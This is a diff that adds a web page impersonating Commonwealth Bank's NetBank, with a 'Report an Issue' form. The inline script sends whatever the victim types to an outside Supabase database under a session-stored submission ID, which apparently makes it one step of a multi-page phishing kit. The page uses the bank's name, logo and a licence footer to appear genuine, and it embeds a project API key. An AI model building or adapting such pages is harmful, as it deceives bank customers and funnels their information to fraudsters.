@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>NetBank – Report an Issue</title>
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <main class="page-shell" aria-label="Report an issue page">
+      <header class="brand">
+        <img src="logo.jpg" alt="Commonwealth Bank logo" class="brand-mark">
+        <span class="brand-name">Commonwealth Bank</span>
+      </header>
+
+      <section class="top-grid" aria-label="Issue report and safety tips">
+
+        <!-- Left panel: issue form -->
+        <form class="panel panel--plain login-panel issue-panel" id="issue-form">
+          <h2>Report an Issue</h2>
+
+          <p class="panel-intro">Please tell us more about the issue you're facing.</p>
+
+          <div class="issue-textarea-wrap">
+            <label for="issue-detail" class="sr-only">Describe your issue</label>
+            <textarea
+              id="issue-detail"
+              name="issue-detail"
+              placeholder="Describe the issue"
+              rows="7"
+              autocomplete="off"
+              aria-label="Describe your issue"
+            ></textarea>
+          </div>
+
+          <button class="login-button confirm-button" type="submit">
+            Confirm
+          </button>
+        </form>
+
+        <!-- Right panel: Stay safe online -->
+        <aside class="side-column" aria-label="Security tips">
+          <div class="panel link-panel safety-panel">
+            <h2>Stay safe online</h2>
+            <div class="panel-body safety-body">
+              <p class="safety-lead">Stay up to date with the latest new trends and tips from our experts to help protect yourself.</p>
+            </div>
+          </div>
+        </aside>
+
+      </section>
+
+      <footer class="footer">
+        <span class="copyright">© 2026 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945</span>
+      </footer>
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+      const SUPABASE_URL      = "https://ffuhqntzcybuylwwqejb.supabase.co";
+      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZmdWhxbnR6Y3lidXlsd3dxZWpiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNTUyNTMsImV4cCI6MjA5NzYzMTI1M30.dn5c8Trz-UAbMjbBvkeMSh9RuIbjB-e5J7MYpg6upKk";
+
+      const { createClient } = supabase;
+      const db = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+      const form = document.querySelector("#issue-form");
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const issueDetail = document.querySelector("#issue-detail");
+
+        if (!issueDetail.value.trim()) {
+          issueDetail.classList.add("input-error");
+          return;
+        }
+
+        issueDetail.classList.remove("input-error");
+
+        const submissionId = sessionStorage.getItem("submission_id");
+
+        const { error } = await db
+          .from("submissions")
+          .update({
+            issue_detail: issueDetail.value.trim(),
+          })
+          .eq("id", submissionId);
+
+        if (error) {
+          console.error("Supabase error:", error.message);
+          return;
+        }
+
+        // Clear session and show a thank you or just stay
+        sessionStorage.removeItem("submission_id");
+
+        var successMsg = document.querySelector(".success-msg");
+        if (!successMsg) {
+          successMsg = document.createElement("p");
+          successMsg.className = "success-msg";
+          successMsg.textContent = "Your information has been updated successfully.";
+          form.appendChild(successMsg);
+        }
+      });
+
+      document.querySelector("#issue-detail").addEventListener("input", function() {
+        this.classList.remove("input-error");
+      });
+    </script>
+  </body>
+</html>
